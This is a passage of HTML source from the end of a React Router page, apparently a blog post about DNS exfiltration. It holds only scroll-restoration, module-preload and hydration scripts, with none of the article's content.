      let storedY = positions[restoreKey || window.history.state.key];
      if (typeof storedY === "number") {
        window.scrollTo(0, storedY);
      }
    } catch (error) {
      console.error(error);
      sessionStorage.removeItem(storageKey2);
    }
  })("react-router-scroll-positions", null)</script><link rel="modulepreload" href="/assets/manifest-472ddab3.js"/><link rel="modulepreload" href="/assets/entry.client-CbzGCsA9.js"/><link rel="modulepreload" href="/assets/chunk-JMJ3UQ3L-ByiRx7JQ.js"/><link rel="modulepreload" href="/assets/root-CKeHVggM.js"/><link rel="modulepreload" href="/assets/blog.dns-exfiltration-B2U8eS-O.js"/><link rel="modulepreload" href="/assets/Footer-CZTWEHt8.js"/><link rel="modulepreload" href="/assets/index-CNWhktjj.js"/><link rel="modulepreload" href="/assets/arrow-left-CIJKdcFe.js"/><script>window.__reactRouterContext = {"basename":"/","future":{"unstable_optimizeDeps":false,"unstable_subResourceIntegrity":false,"v8_middleware":false,"v8_splitRouteModules":false,"v8_viteEnvironmentApi":false},"routeDiscovery":{"mode":"initial"},"ssr":false,"isSpaMode":false};window.__reactRouterContext.stream = new ReadableStream({start(controller){window.__reactRouterContext.streamController = controller;}}).pipeThrough(new TextEncoderStream());</script><script type="module" async="">import "/assets/manifest-472ddab3.js";
import * as route0 from "/assets/root-CKeHVggM.js";
import * as route1 from "/assets/blog.dns-exfiltration-B2U8eS-O.js";
  
  window.__reactRouterRouteModules = {"root":route0,"routes/blog.dns-exfiltration":route1};

import("/assets/entry.client-CbzGCsA9.js");</script></body></html><!--$?--><template id="B:0"></template><!--/$--><div hidden id="S:0"><script>window.__reactRouterContext.streamController.enqueue("[{\"_1\":2,\"_3\":-5,\"_4\":-5},\"loaderData\",{},\"actionData\",\"errors\"]\n");</script><!--$?--><template id="B:1"></template><!--/$--></div><script>function $RC(a,b){a=document.getElementById(a);b=document.getElementById(b);b.parentNode.removeChild(b);if(a){a=a.previousSibling;var f=a.parentNode,c=a.nextSibling,e=0;do{if(c&&8===c.nodeType){var d=c.data;if("/$"===d)if(0===e)break;else e--;else"$"!==d&&"$?"!==d&&"$!"!==d||e++}d=c.nextSibling;f.removeChild(c);c=d}while(c);for(;b.firstChild;)f.insertBefore(b.firstChild,c);a.data="$";a._reactRetry&&a._reactRetry()}};$RC("B:0","S:0")</script><div hidden id="S:1"><script>window.__reactRouterContext.streamController.close();</script></div><script>$RC("B:1","S:1")</script>